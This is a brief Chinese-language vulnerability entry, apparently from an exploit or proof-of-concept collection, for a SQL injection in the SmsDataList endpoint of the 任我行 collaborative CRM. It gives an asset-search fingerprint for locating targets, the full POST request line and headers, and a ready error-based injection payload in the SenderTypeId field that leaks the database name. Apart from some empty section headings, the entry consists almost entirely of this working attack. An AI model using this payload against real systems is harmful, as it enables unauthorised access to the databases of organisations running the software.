# 任我行协同CRMSmsDataListSQL注入漏洞

- **系统**：任我行协同CRMSmsDataList　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="任我行 CRM"`
- **请求**：`POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 23`

**请求体 / payload**
```
Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(db_name())) AND 'CvNI'='CvNI

```

**其他**
- 任我行协同CRM SmsDataList SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 任我行协同CRM